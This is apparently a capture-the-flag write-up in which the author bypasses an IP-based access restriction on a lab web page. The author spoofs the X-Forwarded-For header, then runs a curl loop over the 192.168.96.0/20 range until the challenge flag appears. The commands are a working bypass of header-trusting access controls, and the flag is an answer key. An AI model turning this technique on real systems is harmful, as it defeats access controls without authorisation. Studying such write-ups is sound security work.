Below deck troubles: Component replacement
====================================

## Task
Ahoy, officer,

the ship had to lower its speed because of broken fuel efficiency enhancer. To order a correct spare part, the chief engineer needs to know exact identification code of the spare part. However, he cannot access the web page listing all the key components in use. Maybe the problem has to do with recently readdressing of the computers in the engine room - the old address plan for whole ship was based on range 192.168.96.0/20. Your task is to find out the identification code of the broken component.

May you have fair winds and following seas!

The webpage with spare parts listing is available at http://key-parts-list.cns-jv.tcc.

## Solution
First try to get website, what happened:

	└─$ curl -v http://key-parts-list.cns-jv.tcc
	*   Trying 10.99.0.117:80...
	* Connected to key-parts-list.cns-jv.tcc (10.99.0.117) port 80 (#0)
	> GET / HTTP/1.1
	> Host: key-parts-list.cns-jv.tcc
	> User-Agent: curl/7.88.1
	> Accept: */*
	> 
	< HTTP/1.1 200 OK
	< Date: Wed, 18 Oct 2023 21:09:54 GMT
	< Server: Apache/2.4.56 (Debian)
	< X-Powered-By: PHP/8.0.30
	< Vary: Accept-Encoding
	< Content-Length: 114
	< Content-Type: text/html; charset=UTF-8
	< 
	* Connection #0 to host key-parts-list.cns-jv.tcc left intact
	You are attempting to access from the IP address 10.200.0.21, which is not assigned to engine room. Access denied.

Obviously application doesn't like mine IP address. And I have one idea what to do. Obviously, I can't change physically mine IP address in VPN tunnel - this probably won't work. But web application are very often hidden behind reverse proxy. In that case, real application see IP connection from reverse proxy and not from the client itself. If application need to see which IP address client really has, it's usually done adding header to HTTP request with real IP address. One of this header is X-Forwarded-For. So try it:

	└─$ curl -v -H "X-Forwarded-For: 192.168.96.1" http://key-parts-list.cns-jv.tcc
	*   Trying 10.99.0.117:80...
	* Connected to key-parts-list.cns-jv.tcc (10.99.0.117) port 80 (#0)
	> GET / HTTP/1.1
	> Host: key-parts-list.cns-jv.tcc
	> User-Agent: curl/7.88.1
	> Accept: */*
	> X-Forwarded-For: 192.168.96.1
	> 
	< HTTP/1.1 200 OK
	< Date: Wed, 18 Oct 2023 21:15:06 GMT
	< Server: Apache/2.4.56 (Debian)
	< X-Powered-By: PHP/8.0.30
	< Vary: Accept-Encoding
	< Content-Length: 115
	< Content-Type: text/html; charset=UTF-8
	< 
	* Connection #0 to host key-parts-list.cns-jv.tcc left intact
	You are attempting to access from the IP address 192.168.96.1, which is not assigned to engine room. Access denied.

Nice. Still access denied but application think we have IP address which we send to it. According to previous IP plan, correct IP should be in range 192.168.96.1 - 192.168.111.254. Now just find which one is correct:

	└─$ for i in `seq 96 111`; do for j in `seq 0 255`; do curl -s -H "X-Forwarded-For: 192.168.${i}.${j}" http://key-parts-list.cns-jv.tcc | grep FLAG; done; done
	Fuel efficiency enhancer;FLAG{MN9o-V8Py-mSZV-JkRz};0
